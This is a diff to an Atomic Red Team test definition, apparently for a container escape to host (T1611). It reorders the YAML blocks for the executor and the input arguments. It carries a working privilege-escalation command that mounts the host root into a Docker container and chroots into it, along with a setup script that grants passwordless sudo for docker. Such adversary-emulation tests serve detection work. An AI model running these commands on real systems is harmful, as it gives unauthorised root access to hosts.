@@ -151,14 +151,11 @@ atomic_tests:
     root on the host system.
   supported_platforms:
     - containers
-  executor:
-    name: sh
-    elevation_required: true
-    command: |
-      echo "Current user: #{username}"
-      sudo -u docker_user sh -c "sudo docker run -v /:/mnt --rm --name t1611_privesc -it alpine chroot /mnt id"
-    cleanup_command: |
-      USERNAME="#{username}"; SUDOERS_FILE="/etc/sudoers.d/$USERNAME"; id "$USERNAME" &>/dev/null && userdel -r "$USERNAME" && echo -e "$USERNAME is deleted."; [[ -f "$SUDOERS_FILE" ]] && rm -f "$SUDOERS_FILE"; echo "Cleanup complete."
+  input_arguments:
+    username:
+      default: docker_user
+      description: Username that run attack command
+      type: string
   dependencies:
     - description: Docker
       prereq_command: |
@@ -174,8 +171,11 @@ atomic_tests:
         SUDO_COMMAND="/usr/bin/docker"
         SUDOERS_FILE="/etc/sudoers.d/$USERNAME"
         [[ $EUID -ne 0 ]] && echo "Run as root." && exit 1; id "$USERNAME" &>/dev/null || { useradd -m -s /bin/bash "$USERNAME" && echo "$USERNAME:$PASSWORD" | chpasswd; }; [[ -f "$SUDOERS_FILE" ]] || { echo "$USERNAME ALL=(ALL) NOPASSWD: $SUDO_COMMAND" > "$SUDOERS_FILE" && chmod 440 "$SUDOERS_FILE"; }; echo "Setup complete. User: $USERNAME, Password: $PASSWORD"
-  input_arguments:
-    username:
-      default: docker_user
-      description: Username that run attack command
-      type: string
+  executor:
+    name: sh
+    elevation_required: true
+    command: |
+      echo "Current user: #{username}"
+      sudo -u docker_user sh -c "sudo docker run -v /:/mnt --rm --name t1611_privesc -it alpine chroot /mnt id"
+    cleanup_command: |
+      USERNAME="#{username}"; SUDOERS_FILE="/etc/sudoers.d/$USERNAME"; id "$USERNAME" &>/dev/null && userdel -r "$USERNAME" && echo -e "$USERNAME is deleted."; [[ -f "$SUDOERS_FILE" ]] && rm -f "$SUDOERS_FILE"; echo "Cleanup complete."
